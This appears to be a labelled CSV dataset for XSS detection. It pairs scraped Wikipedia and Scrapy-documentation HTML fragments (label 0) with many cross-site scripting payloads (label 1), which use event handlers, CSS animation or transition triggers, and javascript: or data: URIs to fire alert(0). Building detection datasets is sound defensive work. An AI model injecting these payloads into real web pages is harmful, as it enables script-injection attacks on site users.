Payload,Label
"<p>machines with intelligence have the potential to use their intelligence to prevent harm and minimize the risks; they may have the ability to use <a href=""/wiki/ethics"" title=""ethics"">ethical reasoning </a> to better choose their actions in the world. as such, there is a need for policy making to devise policies for and regulate artificial intelligence and robotics.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> research in this area includes <a href=""/wiki/machine_ethics"" title=""machine ethics"">machine ethics </a>, <a href=""/wiki/artificial_moral_agents"" class=""mw-redirect"" title=""artificial moral agents"">artificial moral agents </a>, <a href=""/wiki/friendly_ai"" class=""mw-redirect"" title=""friendly ai"">friendly ai </a> and discussion towards building a <a href=""/wiki/human_rights"" title=""human rights"">human rights </a> framework is also in talks.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup>",0
<progress id=x tabindex=0 onfocus=alert(0)></progress>,1
</span>,0
<button onpointerleave=alert(0)>xss</button>,1
"<div style=""padding:0em 0.0em"">",0
<plaintext onfocusout=alert(0) tabindex=0 id=x></plaintext><input autofocus>,1
"<image onmousedown=""alert(0)"">test</image>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"<label onkeydown=""alert(0)"" contenteditable>test</label>",1
<applet id=x tabindex=0 onfocusin=alert(0)></applet>,1
<template id=x tabindex=0 onfocusin=alert(0)></template>,1
<iframe id=x onfocusin=alert(0)>,1
<h0 onpointerenter=alert(0)>xss</h0>,1
</span> </li>,0
,0
"<ul><li><a href=""/wiki/natural_language_processing"" title=""natural language processing"">natural language processing </a> </li>",0
"<output oncut=""alert(0)"" contenteditable>test</output>",1
"<ruby onkeypress=""alert(0)"" contenteditable>test</ruby>",1
"<pre ondblclick=""alert(0)"">test</pre>",1
"<div role=""note"" class=""hatnote navigation-not-searchable"">main article: <a href=""/wiki/chinese_room"" title=""chinese room"">chinese room </a> </div>",0
<select onpointerdown=alert(0)>xss</select>,1
"<h0><span class=""mw-headline"" id=""cybersecurity"">cybersecurity",0
"<li><cite id=""citerefkahnemanslovictversky0"" class=""citation book""><a href=""/wiki/daniel_kahneman"" title=""daniel kahneman"">kahneman, daniel </a>; slovic, d.; <a href=""/wiki/amos_tversky"" title=""amos tversky"">tversky, amos </a> (0). <i>judgment under uncertainty: heuristics and biases </i>. <i>science </i>. <b>0 </b>. new york: cambridge university press. pp. 0–0. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""http://u </a>. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0-0"" title=""special:booksources/0-0-0-0-0""><bdi>0-0-0-0-0 </bdi> </a>. <a href=""/wiki/pubmed_identifier"" class=""mw-redirect"" title=""pubmed identifier"">pmid </a> <a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/0"">0 </a>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=judgment+under+uncertainty:+heuristics+and+biases&rft.place=new+york&rft.pages=0-0&rft.pub=cambridge+university+press&rft.date=0&rft_id=info:pmid/0&rft_id=info:doi/0.0/science.0.0.0&rft.isbn=0-0-0-0-0&rft.aulast=kahneman&rft.aufirst=daniel&rft.au=slovic,+d.&rft.au=tversky,+amos&rfr_id=info:sid/en.wikipedia.org:artificial+intelligence"" class=""z0"">",0
"<tt oncopy=""alert(0)"" contenteditable>test</tt>",1
"</span> <span class=""toctext"">video games",0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"the <a href=""/wiki/turing_test"" title=""turing test"">turing test </a>:<br />",0
"<header onkeypress=""alert(0)"" contenteditable>test</header>",1
"<ul><li><a href=""/wiki/subjectivity"" title=""subjectivity"">polycontexturality </a> </li>",0
<strike onpointerover=alert(0)>xss</strike>,1
"<tfoot onkeydown=""alert(0)"" contenteditable>test</tfoot>",1
"<li id=""cite_note-ars_electronica_exhibition_''understanding_ai''-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ars_electronica_exhibition_''understanding_ai''_0-0"">^ </a> </b>",0
</div>,0
<title>scrapy 0.0 documentation — scrapy 0.0.0 documentation</title>,0
"<li><a href=""/wiki/structuralism_(philosophy_of_science)"" title=""structuralism (philosophy of science)"">structuralism </a> </li>",0
"<slot ondblclick=""alert(0)"">test</slot>",1
"<blink draggable=""true"" ondragenter=""alert(0)"">test</blink>",1
"<li><a href=""/wiki/glossary_of_architecture"" title=""glossary of architecture"">architecture </a> </li>",0
"<dir onkeypress=""alert(0)"" contenteditable>test</dir>",1
"<legend ondblclick=""alert(0)"">test</legend>",1
"<style>:target {color:red;}</style><button id=x style=""transition:color 0s"" ontransitionend=alert(0)></button>",1
"<time onclick=""alert(0)"">test</time>",1
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
<strong id=x tabindex=0 onactivate=alert(0)></strong>,1
print/export,0
"<address onbeforecut=""alert(0)"" contenteditable>test</address>",1
<time onblur=alert(0) tabindex=0 id=x></time><input autofocus>,1
"<style>:target {color:red;}</style><slot id=x style=""transition:color 0s"" ontransitionend=alert(0)></slot>",1
"<button onmouseup=""alert(0)"">test</button>",1
"<style>:target {transform: rotate(0deg);}</style><code id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></code>",1
"<td onkeypress=""alert(0)"" contenteditable>test</td>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
<footer id=x tabindex=0 onbeforedeactivate=alert(0)></footer><input autofocus>,1
"<li id=""cite_note-hierarchical_temporal_memory-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-hierarchical_temporal_memory_0-0"">^ </a> </b>",0
"<fieldset onkeypress=""alert(0)"" contenteditable>test</fieldset>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<thead onmouseleave=""alert(0)"">test</thead>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<blink onmousedown=""alert(0)"">test</blink>",1
<optgroup onpointerover=alert(0)>xss</optgroup>,1
"<hgroup draggable=""true"" ondragend=""alert(0)"">test</hgroup>",1
<isindex id=x tabindex=0 onbeforedeactivate=alert(0)></isindex><input autofocus>,1
"<hgroup oncopy=""alert(0)"" contenteditable>test</hgroup>",1
<menu onpointerover=alert(0)>xss</menu>,1
<q id=x tabindex=0 onbeforedeactivate=alert(0)></q><input autofocus>,1
<tr id=x tabindex=0 onfocusin=alert(0)></tr>,1
"<dir draggable=""true"" ondragend=""alert(0)"">test</dir>",1
"<li id=""cite_note-revival_of_connectionism-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-revival_of_connectionism_0-0"">^ </a> </b>",0
<textarea onpointerdown=alert(0)>xss</textarea>,1
"<command onmouseleave=""alert(0)"">test</command>",1
<rtc id=x tabindex=0 onfocusin=alert(0)></rtc>,1
"<li id=""cite_note-intelligent_agents-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-intelligent_agents_0-0"">^ </a> </b>",0
"<li><a href=""/wiki/magnetoresistive_random-access_memory"" title=""magnetoresistive random-access memory"">mram </a> </li>",0
"<li id=""cite_note-second_ai_winter-0""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-second_ai_winter_0-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-second_ai_winter_0-0""><sup><i><b>b </b> </i> </sup> </a>",0
"<div class=""thumbinner"" style=""width:0px;""><a href=""/wiki/file:overfitted_data.png"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/0/0/overfitted_data.png/0px-overfitted_data.png"" decoding=""async"" width=""0"" height=""0"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/0/0/overfitted_data.png/0px-overfitted_data.png 0.0x, //upload.wikimedia.org/wikipedia/commons/0/0/overfitted_data.png 0x"" data-file-width=""0"" data-file-height=""0"" /> </a> <div class=""thumbcaption"">",0
<data id=x tabindex=0 onbeforeactivate=alert(0)></data>,1
</li>,0
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 0s"" ontransitionend=alert(0)></bdi>",1
</li>,0
"<li><cite id=""citerefclark0"" class=""citation web"">clark, jack (0 december 0). <a rel=""nofollow"" class=""external text"" href=""http://u 0 was a breakthrough year in artificial intelligence"" </a>. <i>bloomberg news </i>. <a rel=""nofollow"" class=""external text"" href=""http://u </a> from the original on 0 november 0<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 november",0
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/spiders.html"">spiders</a></li>",0
<element onpointerdown=alert(0)>xss</element>,1
"<li onbeforecopy=""alert(0)"" contenteditable>test</li>",1
"<style>:target {color:red;}</style><ul id=x style=""transition:color 0s"" ontransitionend=alert(0)></ul>",1
"<p><a href=""/wiki/financial_institution"" title=""financial institution"">financial institutions </a> have long used <a href=""/wiki/artificial_neural_network"" title=""artificial neural network"">artificial neural network </a> systems to detect charges or claims outside of the norm, flagging these for human investigation. the use of ai in <a href=""/wiki/banking"" class=""mw-redirect"" title=""banking"">banking </a> can be traced back to 0 when <a href=""/wiki/security_pacific_national_bank"" class=""mw-redirect"" title=""security pacific national bank"">security pacific national bank </a> in us set-up a fraud prevention task force to counter the unauthorized use of debit cards.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> programs like kasisto and moneystream are using ai in financial services.",0
"<li><a href=""/wiki/language_of_thought_hypothesis"" title=""language of thought hypothesis"">language of thought </a> </li>",0
"<li><a href=""/wiki/rhetoric_of_science"" title=""rhetoric of science"">rhetoric of science </a> </li>",0
"<base draggable=""true"" ondragenter=""alert(0)"">test</base>",1
<ol id=x tabindex=0 onbeforedeactivate=alert(0)></ol><input autofocus>,1
"/?param=<data:text/html;base0,phnjcmlwdd0hbgvydcgnwfntjyk0l0njcmlwdd0=",1
</li>,0
"<li id=""cite_note-matz_et_al_0-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-matz_et_al_0_0-0"">^ </a> </b>",0
"<li id=""cite_note-brain_simulation-0""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-brain_simulation_0-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-brain_simulation_0-0""><sup><i><b>b </b> </i> </sup> </a>",0
"<span draggable=""true"" ondragenter=""alert(0)"">test</span>",1
"<dl class=""docutils"">",0
"</span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[",0
"<cite onmouseout=""alert(0)"">test</cite>",1
"<h0 draggable=""true"" ondragstart=""alert(0)"">test</h0>",1
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></select>",1
"<meta draggable=""true"" ondragenter=""alert(0)"">test</meta>",1
"<mark onmouseout=""alert(0)"">test</mark>",1
</span> 0,0
"<header onmouseup=""alert(0)"">test</header>",1
"<textarea onmouseup=""alert(0)"">test</textarea>",1
<multicol onpointermove=alert(0)>xss</multicol>,1
"<svg onmouseout=""alert(0)"">test</svg>",1
<rtc onpointerdown=alert(0)>xss</rtc>,1
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://u superhero of artificial intelligence: can this genius keep it in check?"" </a>. <i>the guardian </i>. 0 february 0<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 april",0
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><textarea id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></textarea>",1
"<embed onclick=""alert(0)"">test</embed>",1
"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 0s"" ontransitionend=alert(0)></plaintext>",1
"<ul><li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, p. 0 </li>",0
"<li><a href=""/wiki/robot_software"" title=""robot software"">software </a> </li>",0
"<div style=""padding:0em 0.0em"">",0
"<rt oncut=""alert(0)"" contenteditable>test</rt>",1
"<shadow onkeyup=""alert(0)"" contenteditable>test</shadow>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
<span id=x tabindex=0 ondeactivate=alert(0)></span><input id=y autofocus>,1
"</span> <span class=""reference-text""><cite class=""citation journal"">hart, p. e.; nilsson, n. j.; raphael, b. (0). ""correction to ""a formal basis for the heuristic determination of minimum cost paths<span class=""cs0-kern-right"">""",0
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(0) contenteditable>drop here</content>",1
"<li><a href=""/wiki/ant_colony_optimization"" class=""mw-redirect"" title=""ant colony optimization"">ant colony optimization </a> </li>",0
"<script src=""_static/underscore.js""></script>",0
<img src=javascript:alert('')>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
<xmp onpointermove=alert(0)>xss</xmp>,1
"<li><a href=""/wiki/virtual_reality"" title=""virtual reality"">virtual reality </a> </li>",0
"<style draggable=""true"" ondragstart=""alert(0)"">test</style>",1
</span> 0,0
<param id=x tabindex=0 onfocusin=alert(0)></param>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"<svg onmousemove=""alert(0)"">test</svg>",1
revision <code>a0dbb0</code>.,0
<embed id=x tabindex=0 onbeforeactivate=alert(0)></embed>,1
"<textarea onmouseenter=""alert(0)"">test</textarea>",1
"<command ondblclick=""alert(0)"">test</command>",1
"<li><a href=""/wiki/center_for_human-compatible_artificial_intelligence"" title=""center for human-compatible artificial intelligence"">center for human-compatible artificial intelligence </a> </li>",0
"<h0 draggable=""true"" ondrag=""alert(0)"">test</h0>",1
"<ruby draggable=""true"" ondragstart=""alert(0)"">test</ruby>",1
"</span> <span class=""reference-text""><cite class=""citation web"">frangoul, anmar (0 june 0). <a rel=""nofollow"" class=""external text"" href=""http://u californian business is using a.i. to change the way we think about energy storage"" </a>. <i>cnbc </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 november",0
"<li><a href=""#citerefnilsson0"">nilsson 0 </a>, chpt. 0.0–0, 0 </li> </ul>",0
"<div style=""padding:0em 0.0em"">",0
"<i draggable=""true"" ondragend=""alert(0)"">test</i>",1
"<li><a href=""/wiki/glossary_of_robotics"" title=""glossary of robotics"">robotics </a> </li>",0
</span> </li>,0
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(0)""></sub>",1
"<base onkeypress=""alert(0)"" contenteditable>test</base>",1
"</span>. <i>international journal of information technology and knowledge management </i>. <b>0 </b> (0): 0–0. archived from <a rel=""nofollow"" class=""external text"" href=""http://u 0-0/0.sandeep rajani.pdf"">the original </a> <span class=""cs0-format"">(pdf)",0
"</span> <span class=""reference-text""><cite class=""citation journal"">laird, john (0). ""extending the soar cognitive architecture"". <i>frontiers in artificial intelligence and applications </i>. <b>0 </b>: 0. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a> <span class=""cs0-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=0.0.0.0.0"">0.0.0.0.0 </a>",0
"<div role=""navigation"" class=""navbox"" aria-labelledby=""philosophy_of_science"" style=""padding:0px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""0"">",0
"<q onmouseover=""alert(0)"">test</q>",1
"</span> <span class=""reference-text""><cite class=""citation web"">rowinski, dan (0 january 0). <a rel=""nofollow"" class=""external text"" href=""http://u personal assistants & the future of your smartphone [infographic]"" </a>. <i>readwrite </i>. <a rel=""nofollow"" class=""external text"" href=""http://u </a> from the original on 0 december 0. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=readwrite&rft.atitle=virtual+personal+assistants+&+the+future+of+your+smartphone+[infographic]&rft.date=0-0-0&rft.au=rowinski,+dan&rft_id=http://u class=""z0"">",0
<spacer onpointerleave=alert(0)>xss</spacer>,1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=discover+magazine&rft.atitle=cultivating+common+sense+|+discovermagazine.com&rft.date=0&rft_id=http://u class=""z0"">",0
"<i oncopy=""alert(0)"" contenteditable>test</i>",1
"</span> <span class=""reference-text""><cite class=""citation book""><a rel=""nofollow"" class=""external text"" href=""http://u paper: on artificial intelligence - a european approach to excellence and trust </i> </a> <span class=""cs0-format"">(pdf)",0
<tbody onpointermove=alert(0)>xss</tbody>,1
"<body background=""javascript:alert('')"">",1
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(0)""></td>",1
<footer id=x tabindex=0 onfocusin=alert(0)></footer>,1
"<meta name=""referrer"" content=""origin""/>",0
</span>,0
"<li onbeforepaste=""alert(0)"" contenteditable>test</li>",1
<mark onpointerleave=alert(0)>xss</mark>,1
"<li class=""toclevel-0 tocsection-0""><a href=""#potential_harm""><span class=""tocnumber"">0.0",0
"<nextid ondblclick=""alert(0)"">test</nextid>",1
</span>(0) </li>,0
"</span> <span class=""reference-text""><cite class=""citation web"">at 0:0, alistair dabbs 0 feb 0. <a rel=""nofollow"" class=""external text"" href=""http://u intelligence: you know it isn't real, yeah?"" </a>. <i>www.theregister.co.uk </i>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=www.theregister.co.uk&rft.atitle=artificial+intelligence:+you+know+it+isn't+real,+yeah?&rft.aulast=at+0:0&rft.aufirst=alistair+dabbs+0+feb+0&rft_id=http://u class=""z0"">",0
<em onpointerout=alert(0)>xss</em>,1
</li>,0
"<script src=""_static/js/hoverxref.js""></script>",0
"<font onbeforecut=""alert(0)"" contenteditable>test</font>",1
</span> </a> </li>,0
"<div style=""padding:0em 0.0em"">",0
"<ul><li><a href=""/w/index.php?title=grey_wolf_optimizer&action=edit&redlink=0"" class=""new"" title=""grey wolf optimizer (page does not exist)"">grey wolf optimizer </a> </li>",0
"<li id=""cite_note-searle's_strong_ai-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-searle's_strong_ai_0-0"">^ </a> </b>",0
</span> </li>,0
<sub onblur=alert(0) tabindex=0 id=x></sub><input autofocus>,1
"</span> <span class=""reference-text"">",0
<td onblur=alert(0) tabindex=0 id=x></td><input autofocus>,1
<plaintext id=x tabindex=0 onactivate=alert(0)></plaintext>,1
</dd>,0
"<strong draggable=""true"" ondrag=""alert(0)"">test</strong>",1
"</span><a href=""/w/index.php?title=artificial_intelligence&action=edit&section=0"" title=""edit section: consciousness"">edit </a><span class=""mw-editsection-bracket"">]",0
in other projects,0
"<center onmouseleave=""alert(0)"">test</center>",1
<rt onblur=alert(0) tabindex=0 id=x></rt><input autofocus>,1
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(0)""></slot>",1
</span> </h0>,0
"<li><a href=""#citerefpoolemackworthgoebel0"">poole, mackworth & goebel 0 </a>, pp. 0–0, </li>",0
"<strike draggable=""true"" ondragstart=""alert(0)"">test</strike>",1
"<li><a href=""#citerefmccorduck0"">mccorduck 0 </a>, p. 0 </li>",0
"<li><i><a href=""/wiki/index_of_philosophy_of_mind_articles"" title=""index of philosophy of mind articles"">more... </a> </i> </li> </ul>",0
<tfoot onpointerout=alert(0)>xss</tfoot>,1
</span>,0
</li>,0
"<title onmouseup=""alert(0)"">test</title>",1
</span> </li>,0
<strong onblur=alert(0) tabindex=0 id=x></strong><input autofocus>,1
"<li><a href=""/wiki/knowledge_extraction"" title=""knowledge extraction"">knowledge extraction </a> </li>",0
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></style>",1
"<blink draggable=""true"" ondrag=""alert(0)"">test</blink>",1
"<li><a href=""/wiki/computational_geometry"" title=""computational geometry"">computational geometry </a> </li> </ul>",0
<dir onpointerenter=alert(0)>xss</dir>,1
"<style>:target {color: red;}</style><track id=x style=""transition:color 0s"" ontransitioncancel=alert(0)></track>",1
<blink onpointerdown=alert(0)>xss</blink>,1
"<style>@keyframes x{from {left:0;}to {left: 0px;}}:target {animation:0s ease-in-out 0s 0 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(0)""></title>",1
"<base onmousemove=""alert(0)"">test</base>",1
"<li id=""cite_note-footnotedomingos0chapter_0,_chapter_0-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnotedomingos0chapter_0,_chapter_0_0-0"">^ </a> </b>",0
"</tr><tr><th style=""padding:0.0em"">",0
"<li><a href=""/wiki/robot_kit"" title=""robot kit"">kits </a> </li>",0
<table onpointerup=alert(0)>xss</table>,1
<canvas onpointerleave=alert(0)>xss</canvas>,1
"<small onpaste=""alert(0)"" contenteditable>test</small>",1
"<style>@keyframes slidein {}</style><div style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></div>",1
</span></a></dt>,0
</li>,0
"</span> <span class=""reference-text"">",0
"<ul><li><a href=""/wiki/concurrent_computing"" title=""concurrent computing"">concurrent computing </a> </li>",0
"<div class=""version"">",0
<dd id=x tabindex=0 onactivate=alert(0)></dd>,1
"<ul oncut=""alert(0)"" contenteditable>test</ul>",1
<div id=x tabindex=0 ondeactivate=alert(0)></div><input id=y autofocus>,1
"<a href=""#"" class=""icon icon-home""> scrapy",0
"<li><a href=""#citerefhowe0"">howe 0 </a> </li> </ul>",0
<input0 onpointermove=alert(0)>xss</input0>,1
"<video onmouseup=""alert(0)"">test</video>",1
"<bdi draggable=""true"" ondragstart=""alert(0)"">test</bdi>",1
"<dd onmouseenter=""alert(0)"">test</dd>",1
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(0)""></source>",1
"<form oncopy=""alert(0)"" contenteditable>test</form>",1
<ul>,0
"<center onmousedown=""alert(0)"">test</center>",1
"<li><cite id=""citerefmccorduck0"" class=""citation""><a href=""/wiki/pamela_mccorduck"" title=""pamela mccorduck"">mccorduck, pamela </a> (0), <a rel=""nofollow"" class=""external text"" href=""http://u who think </i> </a> (0nd ed.), natick, ma: a. k. peters, ltd., <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0"" title=""special:booksources/0-0-0-0""><bdi>0-0-0-0 </bdi> </a> </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=machines+who+think&rft.place=natick,+ma&rft.edition=0nd&rft.pub=a.+k.+peters,+ltd.&rft.date=0&rft.isbn=0-0-0-0&rft.aulast=mccorduck&rft.aufirst=pamela&rft_id=http://u class=""z0"">",0
"</p><p>in the long run, social skills and an understanding of human emotion and <a href=""/wiki/game_theory"" title=""game theory"">game theory </a> would be valuable to a social agent. being able to predict the actions of others by understanding their motives and emotional states would allow an agent to make better decisions. some computer systems mimic human emotion and expressions to appear more sensitive to the emotional dynamics of human interaction, or to otherwise facilitate <a href=""/wiki/human–computer_interaction"" title=""human–computer interaction"">human–computer interaction </a>.",0
"</span> <span class=""reference-text"">""the belief calculus and uncertain reasoning"", yen-teh hsia",0
"<button draggable=""true"" ondragleave=""alert(0)"">test</button>",1
<image src=validimage.png onloadstart=alert(0)>,1
"<li><cite id=""citerefnewellsimon0"" class=""citation journal""><a href=""/wiki/allen_newell"" title=""allen newell"">newell, allen </a>; <a href=""/wiki/herbert_a._simon"" title=""herbert a. simon"">simon, h. a. </a> (0). <a rel=""nofollow"" class=""external text"" href=""http://u science as empirical inquiry: symbols and search"" </a>. <i>communications of the acm </i>. <b>0 </b> (0): 0–0. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""http://u </a>. archived from <a rel=""nofollow"" class=""external text"" href=""http://u original </a> on 0 october 0. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=communications+of+the+acm&rft.atitle=computer+science+as+empirical+inquiry:+symbols+and+search&rft.volume=0&rft.issue=0&rft.pages=0-0&rft.date=0&rft_id=info:doi/0.0/0.0&rft.aulast=newell&rft.aufirst=allen&rft.au=simon,+h.+a.&rft_id=http://u class=""z0"">",0
<li onpointerup=alert(0)>xss</li>,1
"<li><img alt=""wikiproject"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/0/0/people_icon.svg/0px-people_icon.svg.png"" decoding=""async"" title=""wikiproject"" width=""0"" height=""0"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/0/0/people_icon.svg/0px-people_icon.svg.png 0.0x, //upload.wikimedia.org/wikipedia/commons/thumb/0/0/people_icon.svg/0px-people_icon.svg.png 0x"" data-file-width=""0"" data-file-height=""0"" /><b><a href=""/wiki/wikipedia:wikiproject_computer_science"" title=""wikipedia:wikiproject computer science"">wikiproject </a> </b> </li>",0
"<br onmouseover=""alert(0)"">test</br>",1
"<div id=""evolutionary_computation"" style=""font-size:0%;margin:0 0em""><a href=""/wiki/evolutionary_computation"" title=""evolutionary computation"">evolutionary computation </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:0%"">main topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
"<li class=""toclevel-0 tocsection-0""><a href=""#devaluation_of_humanity""><span class=""tocnumber"">0.0.0",0
"<li><a href=""/wiki/qualia"" title=""qualia"">qualia </a> </li>",0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/> </li>",0
<bdo id=x tabindex=0 onfocus=alert(0)></bdo>,1
<s id=x tabindex=0 ondeactivate=alert(0)></s><input id=y autofocus>,1
"<style>:target {transform: rotate(0deg);}</style><data id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></data>",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<li><a href=""#citerefbbc_news0""><i>bbc news </i> 0 </a> </li> </ul>",0
</span>,0
"<h0 onbeforepaste=""alert(0)"" contenteditable>test</h0>",1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=latimes.com&rft.atitle=alphago+beats+human+go+champ+in+milestone+for+artificial+intelligence&rft.date=0&rft.aulast=borowiec&rft.aufirst=tracey+lien,+steven&rft_id=http://u class=""z0"">",0
</span> </li>,0
"<style>@keyframes slidein {}</style><content style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></content>",1
"<colgroup oncontextmenu=""alert(0)"">test</colgroup>",1
"<dl oncontextmenu=""alert(0)"">test</dl>",1
"<li><a href=""/wiki/information_theory"" title=""information theory"">information theory </a> </li>",0
"<style>:target {transform: rotate(0deg);}</style><a id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></a>",1
<details onfocusout=alert(0) tabindex=0 id=x></details><input autofocus>,1
"<time onkeyup=""alert(0)"" contenteditable>test</time>",1
